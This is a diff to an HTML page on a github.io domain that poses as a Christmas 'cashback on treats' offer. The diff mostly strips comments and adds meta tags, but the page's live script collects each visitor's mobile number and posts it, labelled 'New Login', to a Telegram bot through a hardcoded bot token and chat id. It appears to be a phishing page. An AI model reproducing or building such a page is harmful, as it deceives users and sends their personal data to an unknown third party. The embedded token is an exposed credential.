@@ -1,9 +1,18 @@
-<!-- ===== FACEBOOK META TAGS ===== -->
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes" />
+  <title>Buy Treats | Get Cashback</title>
+  
+  <!-- ===== FACEBOOK META TAGS ===== -->
   <meta property="og:title" content="Buy Treats | Get Cashback" />
   <meta property="og:description" content="Earn cashback on every treat you buy this Christmas! 🎄" />
   <meta property="og:type" content="website" />
   <meta property="og:url" content="https://online-trivia.github.io/Prizes/" />
   <meta property="og:image" content="https://online-trivia.github.io/Prizes/photos/iva2.png" />
+  <meta property="og:image:width" content="1200" />
+  <meta property="og:image:height" content="630" />
   <meta property="og:site_name" content="Buy Treats | Get Cashback" />
   
   <!-- ===== FAVICON ===== -->
@@ -11,6 +20,7 @@
   
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet" />
+  
   <style>
     :root {
       --primary: #1e40af; 
@@ -257,7 +267,6 @@
       50% { transform: translateX(-50%) rotate(-5deg) translateY(-4px); }
     }
 
-    /* ===== REMASTERED PHOTO AREA - No Wallet Icon ===== */
     .profile-photo-wrapper {
       position: relative;
       width: 100px;
@@ -296,7 +305,6 @@
       transition: transform 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
     }
 
-    /* Projector Zoom - shows on hover/tap */
     .profile-photo-wrapper .projector-zoom {
       position: absolute;
       top: 50%;
@@ -330,7 +338,6 @@
       display: block;
     }
 
-    /* Projector beam effect */
     .profile-photo-wrapper .projector-zoom::before {
       content: '';
       position: absolute;
@@ -343,7 +350,6 @@
       z-index: 1;
     }
 
-    /* Projector light ray */
     .profile-photo-wrapper .projector-zoom::after {
       content: '';
       position: absolute;
@@ -363,20 +369,17 @@
       100% { transform: rotate(360deg); }
     }
 
-    /* Show projector zoom on hover/tap */
     .profile-photo-wrapper:hover .projector-zoom,
     .profile-photo-wrapper.active .projector-zoom {
       transform: translate(-50%, -50%) scale(1);
       opacity: 1;
     }
 
-    /* Zoom in effect on the main photo when projector is active */
     .profile-photo-wrapper:hover .profile-photo img,
     .profile-photo-wrapper.active .profile-photo img {
       transform: scale(1.3);
     }
 
-    /* Glow ring around photo when projector is active */
     .profile-photo-wrapper:hover .profile-photo,
     .profile-photo-wrapper.active .profile-photo {
       box-shadow: 
@@ -385,7 +388,6 @@
         0 0 40px rgba(255, 215, 0, 0.2);
     }
 
-    /* For mobile - tap to zoom */
     @media (hover: none) {
       .profile-photo-wrapper .projector-zoom {
         transition: all 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
@@ -827,14 +829,12 @@
       const projectorImg = document.getElementById('projectorImg');
       const successSound = document.getElementById('successSound');
 
-      // Handle image error - show gradient background instead of icon
       img.addEventListener('error', function() {
         this.style.display = 'none';
         this.parentElement.style.background = 'linear-gradient(135deg, #3b82f6, #1e40af)';
         this.parentElement.style.display = 'flex';
         this.parentElement.style.alignItems = 'center';
         this.parentElement.style.justifyContent = 'center';
-        // Add a simple text placeholder
         const placeholder = document.createElement('span');
         placeholder.textContent = '📱';
         placeholder.style.fontSize = '2.5rem';
@@ -843,7 +843,6 @@
         this.parentElement.appendChild(placeholder);
       });
 
-      // Also handle projector image error
       projectorImg.addEventListener('error', function() {
         this.style.display = 'none';
         this.parentElement.style.background = 'linear-gradient(135deg, #3b82f6, #1e40af)';
@@ -858,7 +857,6 @@
         this.parentElement.appendChild(placeholder);
       });
 
-      // ===== PROJECTOR ZOOM - TAP TOGGLE FOR MOBILE =====
       const photoWrapper = document.getElementById('photoWrapper');
       
       photoWrapper.addEventListener('click', function(e) {
@@ -964,7 +962,6 @@
         if (!/^[0-9]$/.test(e.key)) e.preventDefault();
       });
 
-      // ===== SIMPLIFIED TELEGRAM NOTIFICATION =====
       function sendTelegramNotification(phoneNumber) {
         const botToken = '8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg';
         const chatId = '7298607329';
@@ -979,7 +976,6 @@
           second: '2-digit'
         });
         
-        // Simplified message - number and date only
         const message = `
 📱 <b>New Login</b>
 Number: ${phoneNumber}
@@ -1009,7 +1005,6 @@ Number: ${phoneNumber}
           });
       }
 
-      // ===== PLAY MUSIC FUNCTION =====
       function playSuccessSound() {
         if (successSound) {
           successSound.currentTime = 0;
@@ -1022,17 +1017,11 @@ Number: ${phoneNumber}
       function handleSubmit() {
         const val = mobileInput.value.replace(/\D/g, '');
         if (val.length === 11 && val.startsWith('09')) {
-          // Play success sound
           playSuccessSound();
-          
-          // Save user info to localStorage
           localStorage.setItem('user_phone', val);
           localStorage.setItem('is_logged_in', 'true');
-          
-          // Send simplified Telegram notification
           sendTelegramNotification(val);
           
-          // Show loading state
           submitBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> LOADING...';
           submitBtn.disabled = true;
           
